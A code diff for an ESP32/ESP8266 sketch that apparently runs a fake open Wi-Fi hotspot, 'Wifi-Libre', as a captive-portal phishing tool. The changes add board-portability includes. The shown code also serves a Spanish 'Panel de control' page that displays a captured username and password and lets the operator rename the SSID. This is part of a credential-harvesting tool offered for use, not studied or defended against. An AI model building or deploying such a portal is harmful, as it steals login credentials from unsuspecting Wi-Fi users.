@@ -1,12 +1,21 @@
+#ifdef ESP32
 #include <WiFi.h>
 #include <WebServer.h>
+#else
+#include <ESP8266WiFi.h>
+#include <ESP8266WebServer.h>
+#endif
 #include <DNSServer.h>
 
 String ssid = "Wifi-Libre";
 
 const byte DNS_PORT = 53;
 DNSServer dnsServer;
+#ifdef ESP32
 WebServer server(80);
+#else
+ESP8266WebServer server(80);
+#endif
 
 String username = "";
 String userpassword = "";
@@ -30,7 +39,6 @@ void handleData() {
   String response = "<!DOCTYPE html><html lang='es'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><title>Panel de control</title><style>body { font-family: Arial, sans-serif; background-color: #f4f4f4; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; } .container { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); max-width: 400px; width: 100%; text-align: center; } h1, h2 { color: #333; } p { color: #555; } input[type='text'] { width: calc(100% - 20px); padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; } input[type='submit'] { width: 100%; padding: 10px; background-color: #007bff; color: #fff; border: none; border-radius: 4px; cursor: pointer; } input[type='submit']:hover { background-color: #0056b3; } </style></head><body><div class='container'><h1>Panel de control</h1><p>Username: " + username + "</p><p>Password: " + userpassword + "</p><h2>Cambiar SSID</h2><form action='/change_ssid' method='post'><input type='text' name='new_ssid' placeholder='Nueva SSID'><br><input type='submit' value='Cambiar SSID'></form><p>Script 100% full hecho por Dylan .i.</p></div></body></html>";
   server.send(200, "text/html", response);
 }
-
 
 void handleChangeSSID() {
   if (server.method() == HTTP_POST) {
